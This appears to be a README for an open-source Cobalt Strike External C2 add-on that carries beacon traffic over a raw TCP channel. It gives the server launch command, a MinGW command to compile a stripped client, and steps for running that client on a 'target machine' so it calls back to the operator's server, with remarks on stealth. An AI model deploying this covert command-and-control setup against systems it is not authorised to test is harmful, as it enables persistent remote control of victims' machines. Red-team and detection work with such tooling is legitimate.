# COBALT STRIKE TCP CHANNEL

This project provides a TCP-based communication channel for Cobalt Strike. This is meant as a base for covert channels implemented in any TCP-based protocol.

To use the channel, load up Cobalt Strike and add a new External C2 listener.
This channel is configured to run on the default Teamserver port of 2222.

To start the server, run the following command:

> python3 [Name].py [Teamserver IP] [Python Server IP] [Port] [Pipename]

- [Name] is the name of your Python server.
- [Teamserver IP] is the IP of your Cobalt Strike teamserver.
- [Python Server IP] is the IP of the machine you are running server.py on. (“0.0.0.0” has been found to work on Linux machines, though it is unknown if this behavior is consistent everywhere.)
- [Port] is the port that the server listens on to communicate with the client over. This is not the same port that the Python server uses to communicate with the teamserver.
- [Pipename] is the name of the pipe the client creates when it runs on the target. This could be any valid pipename.  

If you have the MinGW compiler installed, you may compile the client C code with the following command:

>i686-w64-mingw32-gcc -s -O3 -fvisibility=hidden -o client.exe client.c -lws2_32

Change the client exe name if desired.
Move the resultant executable to your target machine, and then run it with the following command:

>./[Name].exe [Python Server IP] [Port] [Pipename]

- [Name] is the name of your client executable.
- [Python Server IP], [Port], and [Pipename] must be the same as the ones passed to server.py.

## CONSTRAINTS

- This channel expects only one client per instance of server.py. Multiple clients communicating with the same server requires multiple instances of server.py running on different ports.
- This channel does not disconnect its beacon connection. If the server goes down, the client will continue sending packet retransmissions to the dead IP address until the process is killed. (Unless there is a read error on the socket) This may pose stealth issues.
- Once a connection is established, it keeps the TCP connection open until the client is terminated. This can result in extreamly long lasting TCP sessions.
- Mudge defined max payload size as 512 \* 1024 and max buffer size as 1024 \* 1024.

## TODOS/IMPROVEMENTS

- Close TCP connection when sleeping.
- Handle multiple clients on one server.
